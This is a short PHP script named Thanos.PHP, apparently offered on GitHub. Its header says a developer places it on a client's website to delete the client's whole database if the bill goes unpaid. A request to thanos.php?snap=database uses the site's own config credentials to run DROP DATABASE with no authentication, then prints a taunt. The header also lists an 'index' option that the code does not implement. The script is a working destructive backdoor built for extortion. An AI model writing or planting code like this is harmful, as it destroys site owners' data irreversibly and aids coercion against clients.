<?php
/*
*
* Thanos.PHP is a PHP script capable of removing  
* the whole database of a website if client don't
* want to pay the bill. 
*
* Just execute the server side script in the 
* client's website
*
* 	USAGE: thanos.php?snap=<param>
* 	EXAMPLE : www.client.com/thanos.php?snap=database
*
* 	PARAM: 1. database
*		   2. index
*
*/
session_start();
/*
*
* @param session start
*
*/
include('./config.php'); 
/*
*
* @param include configuration file in order to insure
*		 connection if client change the config     
*
*/
$database_path = $database;
/*
*
* @param change parameters
*
*/
$connection = mysqli_connect($server, $user, $password, $database);
mysqli_select_db($connection, $database);
/*
*
* Set the following conditions in your 
* configuration file.
*
* @param set $server = <server name>
* @param set $user = <username>
* @param set $password = <password>
* @param set $database = <database name>
*
*/
$snap = '';

if(isset($_GET['snap'])){
	$snap = $_GET['snap'];
	} else { 
		echo '<br>USAGE: thanos.php?snap=database<br>'; 
		echo '<br>Pull a request at <a href="github.com/isaacdarcilla"> GitHub</a>';
	  	}
/*
*
* @param $_GET `snap` method set condition to `if` statement 
* 		 either snap database or index page
*
*/
if($snap == 'database'){
	$snap_database = "DROP DATABASE `$database_path`;"; 
	$snap_query = mysqli_query($connection, $snap_database);
	echo 'Snap! You should have aimed for the head.';
}
/*
*
* @param end of script
*
*/